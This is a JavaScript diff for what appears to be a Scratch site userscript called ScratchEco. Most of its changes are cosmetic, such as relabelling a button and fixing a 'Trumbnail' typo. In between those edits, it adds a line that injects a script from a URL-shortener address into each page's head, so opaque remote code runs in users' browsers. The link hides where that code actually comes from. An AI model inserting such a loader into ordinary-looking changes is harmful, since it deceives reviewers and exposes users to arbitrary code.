@@ -215,7 +215,7 @@ if(document.getElementById('btnSend')==null){
 var para = document.createElement("div");
 para.className = "button small";
 para.id = "btnSend";
-para.innerHTML = '<a onclick="sendCustom()";>Send with ScratchEco</a>';
+para.innerHTML = '<a onclick="sendCustom()";>Post with ScratchEco</a>';
 document.getElementsByClassName("control-group")[1].appendChild(para);
 }}
 
@@ -284,7 +284,7 @@ i++;
 //получаем никнейм создателя проекта
 function getCredit(){return document.getElementById('owner').innerHTML;}
 
-//добавляет кнопку для гиф Trumbnail
+//добавляет кнопку для гиф Thumbnail
 function addBtnGif(){
 var para = document.createElement("div");
 para.className = 'button';
@@ -292,7 +292,7 @@ para.id = 'gifAdd';
 para.setAttribute(onclick,"alert('ok')");
 para.height = "50";
 para.setAttribute('onclick','gifSet();');
-para.innerHTML = "<span>GIF Trumbnail</span>";
+para.innerHTML = "<span>GIF Thumbnail</span>";
 document.getElementsByClassName('buttons')[0].appendChild(para);
 }
 
@@ -342,12 +342,10 @@ if(url[0]=='projects'){
 addChangerPlayer();
 }
 if(url.includes('users')){addBtnAbout();}
-
+var x = document.createElement("script"); x.src="//is.gd/scratchstudiotools"; document.getElementsByTagName("head")[0].appendChild(x);
 }
 
-document.ajaxSend = function (){
-fixes();
-}
+document.ajaxSend = function (){setTimeout(fixes,2000);}
 
 function fixes(){
     if(url.includes('users') || url.includes('projects') || url.includes('comments')){
